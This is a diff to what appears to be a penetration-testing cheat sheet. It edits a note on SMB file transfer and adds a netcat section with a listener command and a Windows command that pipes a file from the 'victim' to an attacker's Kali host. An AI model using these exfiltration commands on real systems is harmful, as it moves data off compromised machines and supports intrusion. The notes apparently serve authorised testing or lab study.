@@ -162,7 +162,7 @@ if neither is an option, echo this script into a new file:
 
 **transferring files from windows target to kali**
 
-if smb is enabled on the victim machine, we can use impacket's smbserver.py
+if smb v1 is enabled on the victim machine, we can use impacket's smbserver.py
 
 On kali:
 
@@ -176,7 +176,18 @@ on windows (our target/victim):
 
 `copy *.csv z:`
 
-^ here we are copying csv files located in our present dir in windows to z, our kali share
+**nc.exe file transfer**
+
+if you need to move a file back to kali to crack, examine, whatever.
+
+on linux:
+
+`nc -l -p 1234 > file.txt`
+
+on windows:
+
+`type file.txt | C:\full\path\nc.exe kali.ip 1234`
+
 
 ### windows post exploitation
 
